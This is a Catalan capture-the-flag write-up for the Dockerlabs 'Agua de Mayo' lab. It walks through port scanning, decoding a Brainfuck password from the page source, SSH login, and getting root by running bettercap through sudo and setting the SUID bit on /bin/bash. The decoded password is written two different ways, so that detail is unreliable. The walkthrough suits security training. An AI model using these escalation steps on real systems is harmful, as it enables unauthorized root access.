# Agua de Mayo

Plataforma: Dockerlabs
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de diciembre de 2024 21:18

## Reconeixement

### NMAP

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports
```

![image.png](<imagenes/image 30.png>)

```bash
sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![image.png](<imagenes/image 31.png>)

```bash
sudo nmap -p80 --script=http-enum 172.17.0.2
```

![image.png](<imagenes/image 32.png>)

Directori : /images/

Trobem una imatge :

Agua_ssh

Provem de veure si conté dades:

```bash
steghide info agua_ssh.jpg
Demana password
```

![image.png](<imagenes/image 33.png>)

Revisem la web per veure si trobem algo al codi:

```bash
curl -s -X GET [http://172.17.0.2/](http://172.17.0.2/)
```

Ens troba una última linea:

++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.

Busquem un decode :
Codi BrainFuck

Decodifiquem i surt:

bebeaguaqueessano

Conectem per SSH amb usuari "Agua" de la imatge i el password de la web "bebeaguaqueesmassano"

```bash
ssh [agua@172.17.0.2](mailto:agua@172.17.0.2)
```

![image.png](<imagenes/image 34.png>)

![image.png](<imagenes/image 35.png>)

Podem executar "bettercap" sense password i com a root

```bash
sudo bettercap
```

![image.png](<imagenes/image 36.png>)

Veiem que es poden executar instruccions amb ! cmd

Veiem que ja som root

![image.png](<imagenes/image 37.png>)

Per mirar de tenir una shell mes operativa done permis al bash :

```
! chmod +s /bin/bash

```

al sortir de bettercap provem la shell

bin/bash -p

![image.png](<imagenes/image 38.png>)